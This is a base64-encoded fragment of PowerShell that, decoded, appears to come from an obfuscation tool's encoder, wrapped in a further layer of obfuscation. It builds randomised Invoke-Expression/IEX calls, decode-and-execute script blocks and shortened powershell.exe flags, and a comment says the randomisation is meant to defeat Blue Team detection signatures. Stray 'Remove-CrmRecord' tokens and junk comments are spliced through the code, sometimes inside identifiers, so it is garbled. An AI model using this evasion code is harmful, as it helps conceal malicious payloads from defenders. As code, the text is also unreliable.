JykpKSArIChUM0k5dDVlSmlieE0xZG55RTNtZWZjNXMwSWVQMVVPMkYoJyknKSkpCgogICAgIyRlbnY6dGVtcAogICAgIyBtKCkgcmFuZG9tIHN5bnRheCB0byBjcmVhdGUvc2V0IE9GUyB2YXJpYWJsZSAoJE9GUyBpcyB0aGUgT3V0cHV0IEZpZWxkIFNlcGFyYXRvciBhdXRvbWF0aWMgdmFyaWFibGUpLgogICAgIyBVc2luZyBTZXQtSXRlbSBhbmQgU2V0LVZhcmlhYmxlL1NWL1NFVCBzeW50YXguIE5vdCB1c2luZyBOZXctSXRlbSBpbiBjYXNlIE9GUyB2YXJpYWJsZSBhbHJlYWR5IGV4aXN0cy4KICAgICMgSWYgdGhlIE9GUyB2YXJpYWJsZSBkaWQgZXhpc3RzIHRoZW4gd2UgY291bGQgdXNlIGV2ZW4gbW9yZSBzeW50YXg6ICR2YXJuYW1lLCBTZXQtVmFyaWFibGUvU1YsIFNldC1JdGVtL1NFVCwgR2V0LVZhcmlhYmxlL0dWL1ZhcmlhYmxlLCBHZXQtQ2hpbGRJdGVtL0dDSS9DaGlsZEl0ZW0vRGlyL0xzCiAgICAjJGVudjp0ZW1wCiAgICAjIEZvciBtb3JlIGluZm86IGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL3Bvd2Vyc2hlbGwvcmVmZXJlbmNlLzUuMS9taWNyb3NvZnQucG93ZXJzaGVsbC5jb3JlL2Fib3V0L2Fib3V0X2F1dG9tYXRpY192YXJpYWJsZXMKICAgICRTZXRPZnNWYXJTeW50YXggICAgICA9IEAoKQogICAgJFNldE9mc1ZhclN5bnRheCAgICAgKz0gKFQzaTl0NUVqaUJ4bTFETnllM01lRmM1UzBpRXAxdW8yRignU2V0LUl0ZW0nKSkgKyAoVDNJOXQ1RUppQnhNMURueUUzbUVGYzVzMElFUDFVTzJGKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDEsMikpICsgKHQzaTl0NWVqSWJ4bTFETnlFM01FZmM1UzBpRXAxVU8yZignJ1ZhcmlhYmxlOk9GUycnKSkgKyAodDNJOXQ1ZUpJQnhtMURuWUUzbWVmYzVTMEllcDF1TzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDEsMikpICsgKFQzaTl0NWVqSWJ4bTFEbnlFM21FZmM1czBpRXAxVU8yRignJycnKSkKICAgICRTZXRPZnNWYXJTeW50YXggICAgICs9IChHZXQtUmFuZG9tIC1JbnB1dCBAKChUM0k5dDVlSmliWG0xRE55RTNtRWZDNVMwSUVwMVVvMmYoJ1NldC1WYXJpYWJsZScpKSwoVDNJOVQ1ZUppYnhtMURueUUzTUVmYzVTMGlFcDFVbzJmKCdTVicpKSwoVDNJOVQ1RUpJQnhNMUROeUUzTUVmYzVzMGlFUDFVTzJmKCdTRVQnKSkpKSArIChUM0k5dDVFSklCeE0xZE55RTNtRWZjNVMwSUVQMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMSwyKSkgKyAodDNJOXQ1RUpJYnhNMWROeUUzTUVmYzVzMGlFUDFVbzJmKCcnT0ZTJycpKSArIChUM0k5VDVlakliWE0xRE55ZTNtRUZjNVMwaUVwMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMSwyKSkgKyAoVDNJOXQ1ZUpJQlhNMWRueUUzbUVmYzVzMGlFUDF1TzJGKCcnJycpKQogICAgJFNldE9mc1ZhciAgICAgICAgICAgID0gKEdldC1SYW5kb20gLUlucHV0ICRTZXRPZnNWYXJTeW50YXgpCgoiQAokY0o1RjZRd3dEam5IY2hacSA9IEAiCiAkU2V0T2ZzVmFyQmFja1N5bnRheCAgPSBAKCkKICAgICRTZXRPZnNWYXJCYWNrU3ludGF4ICs9IChUM2k5dDVlSklCeG0xRE5ZRTNtZWZDNVMwaUVwMXVPMmYoJ1NldC1JdGVtJykpICsgKHQzSTlUNWVKSWJYTTFETnlFM21lZmM1czBpRXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM0k5VDVlaklCeE0xRG55RTNNRWZjNXMwaUVwMVVvMkYoJydWYXJpYWJsZTpPRlMnJykpICsgKHQzaTl0NWVqaUJ4bTFEbnlFM01lRmM1UzBJRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArICh0M2k5dDVlamlCeG0xRG55RTNtRUZjNXMwaWVQMVVPMkYoJycgJycpKQogICAgJFNldE9mc1ZhckJhY2tTeW50YXggKz0gKEdldC1SYW5kb20gLUlucHV0IEAoKHQzSTl0NWVKaUJ4bTFEbnlFM21FRmM1czBJRXAxVW8yRignU2V0LVZhcmlhYmxlJykpLChUM2k5VDVlSmliWG0xRG55RTNtRWZjNXMwaUVwMXVvMkYoJ1NWJykpLChUM0k5dDVlaklieE0xRG5ZZTNtRUZDNXMwaWVwMVVvMmYoJ1NFVCcpKSkpICsgKHQzSTl0NWVqSWJYbTFEbnlFM01lZkM1czBpRXAxVU8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM0k5dDVFamlCeE0xZE5ZRTNtRUZDNXMwaWVwMXVPMkYoJydPRlMnJykpICsgKFQzaTl0NWVqaWJ4bTFEbnlFM01FZmM1UzBJRVAxdU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM2k5VDVFamlCeE0xRE55RTNNZUZDNXMwSUVwMVVPMmYoJycgJycpKQogICAgJFNldE9mc1ZhckJhY2sgICAgICAgID0gKEdldC1SYW5kb20gLUlucHV0ICRTZXRPZnNWYXJCYWNrU3ludGF4KQoKICAgICMgUmFuZG9taXplIGNhc2Ugb2YgJFNldE9mc1ZhciBhbmQgJFNldE9mc1ZhckJhY2suCiAgICAkU2V0T2ZzVmFyICAgICAgICAgICAgPSAoW0NoYXJbXV0kU2V0T2ZzVmFyICAgICB8IEZvckVhY2gtT2JqZWN0IHskQ2hhciA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JENoYXIgPSAkQ2hhci5Ub1VwcGVyKCl9ICRDaGFyfSkgLUpvaW4gJycKICAgICRTZXRPZnNWYXJCYWNrICAgICAgICA9IChbQ2hhcltdXSRTZXRPZnNWYXJCYWNrIHwgRm9yRWFjaC1PYmplY3QgeyRDaGFyID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uMSkpIHskQ2hhciA9ICRDaGFyLlRvVXBwZXIoKX0gJENoYXJ9KSAtSm9pbiAnJwoKICAgICMgbSgpIHRoZSBjb2RlIHRoYXQgd2lsbCBkZWNyeXB0IGFuZCBleGVjdXRlIHRoZSBwYXlsb2FkIGFuZCByYW5kb21seSBzZWxlY3Qgb25lLgogICAgJEJhc2VTY3JpcHRBcnJheSAgPSBAKCkKICAgICRCYXNlU2NyaXB0QXJyYXkgKz0gKHQzSTlUNUVqSUJYbTFEbnlFM21FRmM1UzBJZVAxVW8yZignKCcpKSArICh0M0k5VDVlSmlieG0xRG5ZZTNNRWZjNVMwaUVwMXVPMkYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWpJYnhtMURueUUzTUVmYzVzMElFcDFVTzJmKCcnJykpICsgJHhOVGoydzgxdmogKyAoJ3swfSctZicnLicpICsgJFNwbGl0ICsgJygnICsgKHQzSTlUNWVKaUJ4TTFkblllM21FRmM1czBpZXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlSklieE0xZG55RTNtRWZDNXMwaUVwMXVPMkYoJycnKSkgKyAkcE9TR0p6VCArICcnJyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM2k5dDVFSmlieG0xRE55ZTNtZWZjNXMwSWVwMVVPMmYoJyknKSkgKyAoVDNpOXQ1ZWppYnhtMURueUUzbWVGYzVTMGlFcDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzaTlUNWVqSWJYTTFETllFM21FRkM1czBJRXAxdU8yRignfCcpKSArIChUM2k5VDVlaklieG0xZG5ZZTNtRWZjNVMwaUVQMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkRm9yRWFjaE9iamVjdCArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlamliWG0xZE5ZZTNtRWZjNXMwaUVwMVVPMkYoJ3snKSkgKyAodDNJOXQ1ZWpJYnhtMWRueWUzbWVGQzVzMGlFcDF1bzJGKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHQzaTl0NUVKSUJ4bTFEbnlFM21lZkM1czBpZXAxdU8yRignKCcpKSArIChUM2k5dDVlSklCeE0xZG55RTNtRUZDNXMwaUVwMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkUmFuZG9tQ29udmVyc2lvblN5bnRheCArICcpJyArICAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNpOXQ1ZWppQlhtMURueWUzTUVmQzVTMGlFcDFVbzJmKCd9JykpICsgKHQzSTl0NWVqaUJ4TTFETnlFM21lRmM1czBJRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlSklCeG0xZG5ZRTNtRUZjNXMwaUVwMVVvMkYoJyknKSkKICAgICRCYXNlU2NyaXB0QXJyYXkgKz0gKHQzSTlUNWVqSUJYbTFkTnlFM01FRmM1czBJZXAxdU8yRignKCcpKSArIChUM2k5dDVFaklCeG0xRE55RTNNZUZjNVMwaUVwMXVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1ZWpJQlhtMWROWUUzbWVmYzVTMGlFUDFVTzJmKCcnJykpICsgJFhOVEoydzgxdmogKyAnJycgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkUmFuZG9tRGVsaW1pdGVyc1RvUHJpbnRGb3JEYXNoU3BsaXQgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWpJYnhtMURuWUUzTUVmQzVzMEllcDFVTzJmKCd8JykpICsgKFQzSTl0NWVqaUJ4TTFETlllM21FRmM1czBJRVAxdW8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRGb3JFYWNoT2JqZWN0ICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHQzaTlUNWVqaUJYTTFkbllFM21FZmM1czBpRXAxdW8yZigneycpKSArIChUM2k5dDVlSklieG0xZG5ZRTNNRUZDNXMwaUVQMXVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1ZUpJQnhNMWRuWUUzTWVmYzVzMEllUDFVTzJmKCcoJykpICsgKHQzaTl0NUVKSUJ4bTFEbnlFM21FZmM1czBJZVAxdU8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRSYW5kb21Db252ZXJzaW9uU3ludGF4ICsgJyknICsgICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlSkliWG0xZG55RTNNRWZjNXMwaUVwMVVPMmYoJ30nKSkgKyAoVDNJOXQ1RWpJQnhNMWRueUUzbUVGYzVzMGllcDF1bzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NUVKaUJ4bTFEbnlFM21FZmM1czBpZVAxVU8yZignKScpKQogICAgJEJhc2VTY3JpcHRBcnJheSArPSAodDNJOXQ1ZUpJYnhtMURueUUzbUVGYzVzMElFUDF1TzJmKCcoJykpICsgKFQzaTl0NWVqSUJ4TTFEbnlFM21lZmM1czBpZXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRFbmNvZGVkQXJyYXkgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOVQ1ZWppYlhtMURueUUzbUVGYzVTMEllcDFVTzJmKCd8JykpICsgKHQzSTlUNWVqSUJ4TTFEbnllM21FZmM1czBpZXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRGb3JFYWNoT2JqZWN0ICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NUVKaUJ4TTFETnlFM21lZmM1czBJZXAxdU8yZigneycpKSArIChUM2k5VDVlSklCWE0xZG55RTNtRWZDNXMwSUVwMVVPMkYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWppYnhNMURuWWUzbUVmYzVTMGlFcDFVTzJmKCcoJykpICsgKFQzaTl0NUVKSUJYbTFkTnlFM21FZmM1UzBJZXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRSYW5kb21Db252ZXJzaW9uU3ludGF4ICsgJyknICsgICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5VDVlamliWG0xRE55RTNtRWZjNVMwSWVQMVVPMmYoJ30nKSkgKyAoVDNJOXQ1ZUppQlhtMURueUUzbUVmQzVzMGllcDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTlUNUVKaUJ4TTFEbnlFM01lRmM1czBpRVAxdU8yZignKScpKQogICAgCiAgICAjIG0oKSByYW5kb20gSk9JTiBzeW50YXggZm9yIGFsbCBhYm92ZSBvcHRpb25zLgogICAgJE5ld1NjcmlwdEFycmF5ICAgPSBAKCkKICAgICROZXdTY3JpcHRBcnJheSAgKz0gKEdldC1SYW5kb20gLUlucHV0ICRCYXNlU2NyaXB0QXJyYXkpICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJEpvaW4gKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWpJQnhtMWROeWUzbUVGQzVzMGlFUDFVTzJmKCcnJycpKQogICAgJE5ld1NjcmlwdEFycmF5ICArPSAkSm9pbiArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChHZXQtUmFuZG9tIC1JbnB1dCAkQmFzZVNjcmlwdEFycmF5KQogICAgJE5ld1NjcmlwdEFycmF5ICArPSAkU3RySm9pbiArICcoJyArIChUM0k5dDVlSmlCeG0xRE5ZRTNtZWZjNXMwaWVwMVVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWppQlhtMWRuWUUzTWVmYzVTMGllUDFVbzJGKCcnJycpKSArIChUM0k5VDVlaklieE0xRG55ZTNNZUZjNXMwaUVQMXVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1ZUpJQlhNMWRueUUzTUVmYzVzMEllUDFVTzJmKCcsJykpICsgKFQzSTlUNWVqSUJYTTFEbnllM21lZmM1UzBpZVAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChHZXQtUmFuZG9tIC1JbnB1dCAkQmFzZVNjcmlwdEFycmF5KSArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICh0M0k5VDVlaklieG0xZG55RTNNRUZDNXMwaUVwMVVPMmYoJyknKSkKCiAgICAjJGVudjp0ZW1wCiAgICAjIFJhbmRvbWx5IHNlbGVjdCBvbmUgb2YgdGhlIGFib3ZlIGNvbW1hbmRzLgogICAgJE5ld1NjcmlwdCA9IChHZXQtUmFuZG9tIC1JbnB1dCAkTmV3U2NyaXB0QXJyYXkpCgogICAgIyBtKCkgcmFuZG9tIGludm9rZSBvcGVyYXRpb24gc3ludGF4LgogICAgIyBCZWxvdyBjb2RlIGJsb2NrIGlzIGEgY29weSBmcm9tIE91dC1PYmZ1c2NhdGVkU3RyaW5nQ29tbWFuZC5wczEuIEl0IGlzIGNvcGllZCBpbnRvIHRoaXMgZW5jb2RpbmcgZnVuY3Rpb24gc28gdGhhdCB0aGlzIHdpbGwgcmVtYWluIGEgc3RhbmRhbG9uZSBzY3JpcHQgd2l0aG91dCBkZXBlbmRlbmNpZXMuCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCAgPSBAKClSZW1vdmUtQ3JtUmVjb3JkCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAoR2V0LVJhbmRvbSAtSW5wdXQgQCgodDNJOXQ1ZWpJYnhNMWRueUUzTUVmYzVzMGlFcDF1TzJmKCdJRVgnKSksKFQzSTl0NWVqSWJYbTFEbnlFM21FRkM1czBpZXAxVU8yZignSW52b2tlLUV4cHJlc3Npb24nKSkpKQogICAgIyRlbnY6dGVtcAogICAgIyBBZGRlZCBiZWxvdyBzbGlnaHRseS1yYW5kb21pemVkIG9iZnVzY2F0ZWQgd2F5cyB0byBmb3JtIHRoZSBzdHJpbmcgJ2lleCcgYW5kIHRoZW4gaW52b2tlIGl0IHdpdGggLiBvciAmLgogICAgIyBUaG91Z2ggZmFyIGZyb20gZnVsbHkgYnVpbHQgb3V0LCB0aGVzZSBhcmUgaW5jbHVkZWQgdG8gaGlnaGxpZ2h0IGhvdyBJRVgvSW52b2tlLUV4cHJlc3Npb24gaXMgYSBncmVhdCBpbmRpY2F0b3IgYnV0IG5vdCBhIHNpbHZlciBidWxsZXQuCiAgICAjIFRoZXNlIG1ldGhvZHMgZHJhdyBvbiBjb21tb24gZW52aXJvbm1lbnQgdmFyaWFibGUgdmFsdWVzIGFuZCBQb3dlclNoZWxsIEF1dG9tYXRpYyBWYXJpYWJsZSB2YWx1ZXMvbWV0aG9kcy9tZW1iZXJzL3Byb3BlcnRpZXMvZXRjLgogICAgJEludm9jYXRpb25PcGVyYXRvciA9IChHZXQtUmFuZG9tIC1JbnB1dCBAKChUM0k5dDVlaklCWG0xRFJlbW92ZS1Dcm1SZWNvcmRueUUzTWVGQzVTMGlFcDFVbzJGKCcuJykpLCh0M0k5dDVlaklieG0xRE55RTNtZWZjNXMwSUVwMVVPMmYoJyYnKSkpKSArIChUM0k5dDVFSklCWG0xZG5ZRTNtRUZDNVMwaUVwMVVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkKICAgICRJbnZva2VFeHByZXNzaW9uU3ludGF4ICs9ICRJbnZvY2F0aW9uT3BlcmF0b3IgKyAoJ3soKDMgLSAxKSAqIDQpfXs3fXsoKFtpbnRdKDYgLyAyKSkgKiAoNCAtIDIpKX17OX17KDEgLSAoMiAtIDEpKX17MX17KDUgLSAoNCAtIDIpKX17KChbaW50XSgyNCAvIDMpKSAtICgzICsgMCkpfXsyfXsoKDQgLSAyKSAqIDIpfXsoMiAqICgtNCArIDkpKX0nLWYnMV0rJywnYCRTbUpsMU1IMU1Ma2wnLCdbKDEgKiAoMjcgLSAxNCkpJywnaGVsJywnXSsnJywnbElkJywnZWxsJywnJFNoJywnKCBgJywnSWRbJywneCcpJykKICAgICRJbnZva2VFeHByZXNzaW9uU3ludGF4ICs9ICRJbnZvY2F0aW9uT3BlcmF0b3IgKyAoJ3soOSAtIDQpfXsoMiArICgtMSArIDIpKX17KDEgLSAoMyAtIDIpKX17KCg0IC0gMikgKiAoMyAtIDEpKX17Mn17KC0oMyAtIDIpICsgKDMgLSAxKSl9Jy1mJ1BTJywnWycsJ21lJywnYCRkaWFzTmlyelNqN0InLCdIbycsJyggJykgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCg0LDIxKSkgKyAodDNJOXQ1ZUpJQnhtMURuWUUzTWVGQzVTMGlFcDF1bzJGKCddK2AkUHNob01lWycpKSArIChHZXQtUmFuZG9tIC1JbnB1dCBAKDMwLDM0KSkgKyAodDNJOVQ1ZWpJYnhtMUROWWUzbWVmQzVzMGlFcDF1TzJmKCddKyd4JyknKSkKICAgICRJbnZva2VFeHByZXNzaW9uU3ludGF4ICs9ICRJbnZvY2F0aW9uT3BlcmF0b3IgKyAoJ3soMiAqIDIpfXsoMSAqIDUpfXsyfXsxfXswfXszfSctZidwZWMnLCdvbVMnLCd2OkMnLCdbKDIgKiAyKSwnLCcoIGAnLCckbDBRV2hKMTFFZjFUSHAnKSArIChHZXQtUmFuZG9tIC1JbnB1dCBAKDE1LDI0LDI2KSkgKyAoVDNJOXQ1ZWppQlhNMURueUUzTUVmYzVzMElFUDFVTzJmKCcsKC0oMCArIDEpICsgMjYpXS1Kb2luJycpJykpCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAkSW52b2NhdGlvbk9wZXJhdG9yICsgKCd7MH0nLWYnKCgnKSArIChHZXQtUmFuZG9tIC1JbnB1dCBAKChUM2k5VDVFamlCWE0xZE5ZZTNtRUZDNVMwaUVQMVVvMmYoJ0dldC1WYXJpYWJsZScpKSwodDNpOXQ1RWpJQlhtMWRuWUUzTUVmQzVzMGlFcDF1TzJGKCdHVicpKSwodDNJOVQ1ZUppQnhtMURuWUUzTUVmYzVzMEllcDFVbzJGKCdWYXJpYWJsZScpKSkpICsgKFQzaTl0NWVqSUJ4bTFEbllFM21lRmM1czBJZVAxVU8yZignICcqbWRyKicpLk5hbWVbKFtpbnRdKCgtNCArIDEzKSAvICgwICsgMykpKSwoMSAqICgxOCAtIDcpKSwyXS1Kb2luJycpJykpCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAkSW52b2NhdGlvbk9wZXJhdG9yICsgKCd7KCgxIC0gMSkgKyAwKX17MX0nLWYnKCcsJyAnKSArIChHZXQtUmFuZG9tIC1JbnB1dCBAKChUM0k5VDVlaklieG0xRE5ZRTNtZWZDNXMwaUVQMXVvMkYoJyRvelJsZXNVQmtLN2tzZVBCNHd4ZS5Ub1N0cmluZygpJykpLCh0M0k5dDVlaklCeG0xRE5ZRTNtRWZjNXMwSUVwMVVvMkYoJyhbU3RyaW5nXSRvelJsZVN1QmtLN2tTZXBiNFd4ZSknKSkpKSArICgneygxIC0gMSl9ezF9ezJ9Jy1mJ1soMyAtIDIpLCgtKDEgKyAxKSArIChbaW50XSgxMCAvIDIpKSldKycsJyd4Jy1KbycsJ2luJycpJykKICAgICMgQ29tbWVudGluZyBiZWxvdyBvcHRpb24gc2luY2UgJGVudjpQdWJsaWMgZGlmZmVycyBpbiBzdHJpbmcgdmFsdWUgZm9yIG5vbi1FbmdsaXNoIG9wZXJhdGluZyBzeXN0ZW1zLgogICAgIyRlbnY6dGVtcAogICAgIyRJbnZva2VFeHByZXNzaW9uU3ludGF4ICs9ICRJbnZvY2F0aW9uT3BlcmF0b3IgKyAiKCBgJGVudjpQdWJsaWNbMTNdK2AkZW52OlB1YmxpY1s1XSsneCcpIgoKICAgICMgUmFuZG9tbHkgY2hvb3NlIGZyb20gYWJvdmUgaW52b2tlIG9wZXJhdGlvbiBzeW50YXhlcy5SZW1vdmUtQ3JtUmVjb3JkCiAgICAkSW52b2tlRXhwcmVzc2lvbiA9IChHZXQtUmFuZG9tIC1JbnB1dCAkSW52b2tlRXhwcmVzc2lvblN5bnRheCkKCiAgICAjIFJhbmRvbWl6ZSB0aGUgY2FzZSBvZiBzZWxlY3RlZCBpbnZva2Ugb3BlcmF0aW9uLgogICAgJEludm9rZUV4cHJlc3Npb24gPSAoW0NoYXJbXV0kSW52b2tlRXhwcmVzc2lvbiB8UmVtb3ZlLUNybVJlY29yZCBGb3JFYWNoLU9iamVjdCB7JENoYXIgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4xKSkgeyRDaGFyID0gJENoYXIuVG9VcHBlcigpfSAkQ2hhcn0pIC1Kb2luICcnCiAgICAKICAgICMgQ2hvb3NlIHJhbmRvbSBJbnZva2UtRXhwcmVzc2lvbi9JRVggc3ludGF4IGFuZCBvcmRlcmluZzogSUVYICgkU2NyaXB0U3RyaW5nKSBvciAoJFNjcmlwdFN0cmluZyB8IElFWCkKICAgICRJbnZva2VPcHRpb25zICA9IEAoKQogICAgJEludm9rZU9wdGlvbnMgKz0gKFQzSTlUNWVKaUJ4bTFETnlFM21FZmM1UzBpZXAxdU8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRJbnZva2VFeHByZXNzaW9uICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTlUNWVqSUJ4TTFkbllFM01lRmM1czBpRXAxdU8yZignKCcpKSArIChUM2k5dDVlaklieE0xRG5ZZTNNRWZjNVMwaUVQMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkTmV3U2NyaXB0ICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzaTl0NWVqSWJYbTFkblllM21lRmM1czBpRVAxVU8yRignKScpKSArIChUM0k5VDVlSmlieG0xRG55ZTNtZWZjNXMwaUVwMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkKICAgICRJbnZva2VPcHRpb25zICs9IChUM0k5dDVlSklCeE0xZG55ZTNtZWZjNVMwSWVQMVVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkTmV3U2NyaXB0ICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NWVqaUJYbTFkTllFM01FRmM1UzBJRVAxVU8yZignfCcpKSArICh0M0k5dDVlSmlCeG0xRG55RTNtRWZjNVMwSUVwMVVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkSW52b2tlRXhwcmVzc2lvbgoKICAgICROZXdTY3JpcHQgPSAoR2V0LVJhbmRvbSAtSW5wdXQgJEludm9rZU9wdGlvbnMpCgogICAgIyRlbnY6dGVtcAogICAgIyBJZiB1c2VyIGRpZCBub3QgaW5jbHVkZSAtUGFzc1RocnUgZmxhZyB0aGVuIGNvbnRpbnVlIHdpdGggYWRkaW5nIGV4ZWN1dGlvbiBmbGdzIGFuZCBwb3dlcnNoZWxsLmV4ZSB0byAkTmV3U2NyaXB0LgogICAgSWYoISRQU0JvdW5kUGFyYW1ldGVyc1soJ3soMiArIDApfXsoMSArIDIpfXswfXsoMSArIDApfSctZidUaCcsJ3J1JywnUGEnLCdzcycpXSkKICAgIHsKICAgICAgICAjIEFycmF5IHRvIHN0b3JlIGFsbCBzZWxlY3RlZCBQb3dlclNoZWxsIGV4ZWN1dGlvbiBmbGFncy4KICAgICAgICAkUG93ZXJTaGVsbEZsYWdzID0gQCgpCgogICAgICAgICMgQnVpbGQgdGhlIFBvd2VyU2hlbGwgZXhlY3V0aW9uIGZsYWdzIGJ5IHJhbmRvbWx5IHNlbGVjdGluZyBleGVjdXRpb24gZmxhZ3Mgc3Vic3RyaW5ncyBhbmQgcmFuZG9taXppbmcgdGhlIG9yZGVyLgogICAgICAgICMgVGhpcyBpcyB0byBwcmV2ZW50IEJsdWUgVGVhbSBmcm9tIHBsYWNpbmcgZmFsc2UgaG9wZSBpbiBzaW1wbGUgc2lnbmF0dXJlcyBmb3IgY29tbW9uIHN1YnN0cmluZ3Mgb2YgdGhlc2UgZXhlY3V0aW9uIGZsYWdzLgogICAgICAgICRDb21tYW5kbGluZU9wdGlvbnMgPSBOZXctT2JqZWN0IFN0cmluZ1tdKDApCiAgICAgICAgSWYoJFBTQm91bmRQYXJhbWV0ZXJzWygneygwICsgKDEgLSAxKSl9eygzIC0gMil9Jy1mJ05vRXgnLCdpdCcpXSkKICAgICAgICB7CiAgICAgICAgICAkRnVsbEFyZ3VtZW50ID0gKFQzaTlUNUVqSUJ4bTFEbnlFM21FZmM1UzBpZXAxdW8yRignLU5vRXhpdCcpKTsKICAgICAgICAgICRDb21tYW5kbGluZU9wdGlvbnMgKz0gJEZ1bGxBcmd1bWVudC5TdWJTdHJpbmcoMCwoR2V0LVJhbmRvbSAtTWluaW11bSA0IC1NYXhpbXVtICgkRnVsbEFyZ3VtZW50Lkxlbmd0aCsxKSkpCiAgICAgICAgfQogICAgICAgIElmKCRQU0JvdW5kUGFyYW1ldGVyc1soJ3sxfXsoMSAtIDEpfSctZidmaWxlJywnTm9Qcm8nKV0pCiAgICAgICAgewogICAgICAgICAgJEZ1bGxBcmd1bWVudCA9IChUM2k5dDVFSklCeE0xRG5ZRTNtRWZDNXMwSUVwMVVPMmYoJy1Ob1Byb2ZpbGUnKSk7CiAgICAgICAgICAkQ29tbWFuZGxpbmVPcHRpb25zICs9ICRGdWxsQXJndW1lbnQuU3ViU3RyaW5nKDAsKEdldC1SYW5kb20gLU1pbmltdW0gNCAtTWF4aW11bSAoJEZ1bGxBcmd1bWVudC5MZW5ndGgrMSkpKQogICAgICAgIH0KICAgICAgICBJZigkUFNCb3VuZFBhcmFtZXRlcnNbKCd7MH17Mn17KDEgKyAwKX0nLWYnTm9uSW4nLCd0aXZlJywndGVyYWMnKV0pCiAgICAgICAgewogICAgICAgICAgJEZ1bGxBcmd1bWVudCA9IChUM0k